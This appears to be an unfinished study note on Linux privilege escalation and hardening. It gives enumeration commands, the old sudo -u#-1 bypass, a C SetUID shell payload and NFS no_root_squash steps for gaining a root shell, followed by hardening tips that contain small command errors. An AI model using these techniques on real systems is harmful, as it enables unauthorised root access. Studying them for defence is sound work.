# Linux-Privilege-Escalation
This document contains a list of privilege escalation techniques in Linux and how to harden the system to prevent them.

[Technicques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) 

## System Information
Gaining knowledge of system to exploit
|Name|Command|Description|
|---|---|---|
|OS infor| `(cat /proc/version \|\| uname -a ) 2>/dev/null &#13; cat /etc/os-release 2>/dev/null` |Finding version and searching for exploits|
|Path|`echo $PATH`|Find dir inside PATH that has write permission to hijack libraries or binaries|
|Environment|`(env \|\| set) 2>/dev/null`||
|Sudo version|`sudo -V \| grep "Sudo ver" \| grep "1\\.[01234567]\\.[0-9]\\+\\\|1\\.8\\.1[0-9]\\*\\\|1\\.8\\.2[01234567]"`|sudo < v1.28 `sudo -u#-1 /bin/bash`|
|Dmesg signature verification failed|`dmesg 2>/dev/null \| grep "signature"`||
|Enumerate possible defenses|||

## Docker Breakout

## Usefull software
List usefull binaries
```sh
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Check version of the installed packages and services
```sh
dpkg -l #Debian
rpm -qa #Centos
```
## Scheduled//Cron jobs

## Services

## Timers

## Containerd (ctr) privilege escalation

## RunC privilege escalation

## D-Bus

## Users

## Writeable PATH abuses
### euid, ruid, suid

SUID or GUID, when set, allows the process to execute under the specified user or group.
List all binary with suid/guid:
```cmd
find / -perm -4000 -ls 2>/dev/null
find / -perm -u=s -ls 2>/dev/null
find / -perm -2000 -ls 2>/dev/null
find / -perm -g=s -ls 2>/dev/null
```
Using [GTFOBins](https://gtfobins.github.io/) to privesc and get a shell.

Can write a SetUID binary and get a shell:
```C++
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(1000, 1000, 1000);
    system("/bin/bash");
    return 0;
}
```
## Shared Object Hijacking

## Capabilities

## ACLs

## NFS no_root_squash/no_all_squash misconfiguration PE
This is a misconfiguration in the NFS configuration. If the options no_root_squash or no_all_squash are found in ```/etc/exports```, then you can access it from a client and write inside that directory as if you were the local root of the machine.
```cmd
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Or use a **C SUID payloads** (see in [euid, ruid, suid]())

[NFS_privesc](https://www.errno.fr/nfs_privesc.html)

# Hardening (System configuration)
[Linux configuration](https://cyber.gouv.fr/en/publications/configuration-recommendations-gnulinux-system)
## Patririoning
## Account
## Access control
### Unix traditional model
1. Change default usmask for the shell to 0077.
```cmd
echo  'umask 0077' >> /etc/profile'
```
Change default usmask for services to 0027. Thit value can be defined directly in configuration file of the service **(UMask=0027)**.

[Understanding UMASK value](https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html)

2. Create a group and ony member in this group can run sudo
```cmd
chmod 760 /usr/bin/sudo
```
3. Sudo configuration guidelines (edit /etc/sudoers)

| Enable | Value |
| ------------- |-------------|
| noexec| applies the **NOEXEC** tag by defaulr on the command|
| requiretty| requires the user to have a tty login|
| use_pty | users a pseudo-tty when a command is executed|
| umask=0077 | forces umask to more restrictive mask |
| ignore_dot | ignores the "." in $PATH|
| env_reset | resets the env variables |

4. Restrict the normal user to run only limited set of commands
- Using restricted shell
```cmd
# create the restricted shell
cp /bin/bash /bin/rbash
# modify the target user
usermod -s /bin/rbash {username}
```
### AppArmor
### SELinux


## Files and directories
### Sensitive files and directories
1. Limiting the rights
2. Changing the secrets and access rights as soon as possible
### Named ipc, sockets or pipes
### Access rights
1. Avoiding files or dir without a known user.
```cmd
find / \( -nouser -o nogroup \) -ls 2>/dev/null
```
2. Set **sticky bit**
3. Ignores setuid / setgid bits and exec right (especial root rights). 
```cmd
chmod 744 {filename}
chmod u-s {filename}
chmod g-s {filename}
```
